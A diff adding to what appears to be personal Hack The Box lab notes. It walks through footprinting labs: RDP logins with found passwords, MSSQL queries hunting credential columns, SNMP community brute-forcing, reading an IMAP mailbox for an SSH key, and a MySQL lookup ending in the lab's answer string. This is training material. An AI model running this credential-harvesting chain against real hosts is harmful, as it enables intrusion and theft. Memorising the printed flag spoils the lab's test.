@@ -679,3 +679,56 @@ Nmap done: 1 IP address (1 host up) scanned in 103.92 seconds
 
 └─$ xfreerdp3 /v:10.129.202.41 /u:alex /p:'lol123!mD' /cert:ignore /sec:nla
 ```
+Once you find the password on the dev folder in important.txt you can rdp into the host with that password and account name.
+```bash
+└─$ xfreerdp3 /u:administrator /p:'87N1ns@slls83' /v:10.129.202.41         
+```
+
+From there you connect to the MSSQL server and you can dump the HTB user and pass via --
+```sql
+SELECT name FROM sys.databases;
+USE accounts;
+GO
+
+SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME
+FROM INFORMATION_SCHEMA.COLUMNS
+WHERE COLUMN_NAME LIKE '%user%'
+   OR COLUMN_NAME LIKE '%login%'
+   OR COLUMN_NAME LIKE '%pass%'
+   OR COLUMN_NAME LIKE '%pwd%'
+   OR COLUMN_NAME LIKE '%cred%'
+ORDER BY TABLE_NAME;
+
+SELECT TOP 200 * FROM dbo.devsacc;
+```
+Boom flag.
+
+# Footprinting Lab3 Hard
+
+Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.
+    onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.147.148
+	    #backup
+	    #commnity is backup
+    
+    braa backup@10.129.147.148:.1.3.6.*
+        10.129.147.148:82ms:.80:tom NMds732Js2761
+
+    openssl s_client -connect 10.129.147.148:imaps
+        #find email with ssh key
+        	1 SELECT INBOX
+                * OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
+                * 1 EXISTS
+                * 0 RECENT
+            1 FETCH 1 all
+
+            1 LIST * *
+            1 FETCH 1 body[text]
+                #found ssh key
+
+    ssh -i tom_id_rsa tom@10.129.147.148
+        cat .bash_history   (shows mysql)
+    mysql -u tom -p
+        use users;
+        select * from users where username like 'HTB';
+        
+    cr3n4o7rzse7rzhnckhssncif7ds
